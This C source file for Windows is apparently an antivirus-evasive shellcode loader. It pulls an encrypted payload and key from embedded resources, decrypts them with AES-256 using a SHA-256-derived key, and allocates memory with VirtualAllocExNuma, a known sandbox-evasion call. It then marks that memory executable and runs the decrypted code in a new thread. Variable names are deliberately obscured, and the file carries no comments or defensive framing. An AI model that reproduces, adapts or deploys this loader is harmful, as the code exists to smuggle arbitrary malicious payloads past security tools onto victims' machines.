#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")


void loadkumres(const char* ressus, unsigned char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, ressus, RT_RCDATA);
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (unsigned char*)LockResource(hResData);
}


void thisisthkhal(char* codekumaa, DWORD codekumaaLen, char* keydude1299, DWORD keydude1299Len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)keydude1299, keydude1299Len, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)codekumaa, &codekumaaLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


int main() {
  

    char* kkeyakesey;
    DWORD kkeyakeseyLen;
    loadkumres("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);

    char* kkcode;
    DWORD kkcodeLen;
    loadkumres("dhanushcode56", &kkcode, &kkcodeLen);

   
     unsigned char karik12y[kkeyakeseyLen];
    unsigned char karic0d2[kkcodeLen];

   
    memcpy(karik12y, kkeyakesey, kkeyakeseyLen);
    memcpy(karic0d2, kkcode, kkcodeLen);

   

    LPVOID coohsllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    Sleep(1000);
    DWORD oldProtect;
    thisisthkhal((char*)karic0d2, sizeof(karic0d2), karik12y, sizeof(karik12y));  
memcpy(coohsllo, karic0d2, sizeof(karic0d2));  
    VirtualProtect(coohsllo, sizeof(karic0d2), PAGE_EXECUTE_READ, &oldProtect); 
HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coohsllo, NULL, 0, NULL);  
    WaitForSingleObject(tHandle, INFINITE);  

    return 0;
}
